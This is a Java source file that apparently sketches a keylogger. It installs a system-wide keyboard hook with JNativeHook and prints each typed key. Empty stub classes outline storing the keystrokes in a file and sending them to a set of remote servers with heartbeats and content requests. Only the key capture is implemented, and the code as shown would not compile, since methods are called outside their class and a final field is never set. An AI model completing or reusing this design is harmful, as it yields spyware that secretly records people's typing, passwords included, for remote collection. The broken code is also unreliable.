package test;

import java.io.File;
import java.util.Map;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class main {

	public static void main(String[] args) throws NativeHookException {

		GlobalScreen.registerNativeHook();

		GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {

			@Override
			public void nativeKeyTyped(NativeKeyEvent e) {
				System.out.println("Native key typed " + e.getKeyChar());

				Character c = calculateFinalChar(e);
				addChar(c);

				if (e.getKeyChar() == 'q') {
					GlobalScreen.unregisterNativeHook();
				}
			}

			@Override
			public void nativeKeyReleased(NativeKeyEvent e) {
			}

			@Override
			public void nativeKeyPressed(NativeKeyEvent e) {
			}
		});
	}

	public static class FileManager {

		private File file;

		public Character calculateFinalChar(NativeKeyEvent event) {
			return null;
		}

		public void addChar(Character c) {

		}

		public byte[] getContent() {
			return null;
		}

		public void resetContent() {

		}
	}

	public static class TransportClient {

		private final Map<String, Integer> servers;

		public void sendHeartBeat() {

		}

		public void requestContent() {

		}

		public void addServer() {

		}

		public void removeServer() {

		}

	}

}
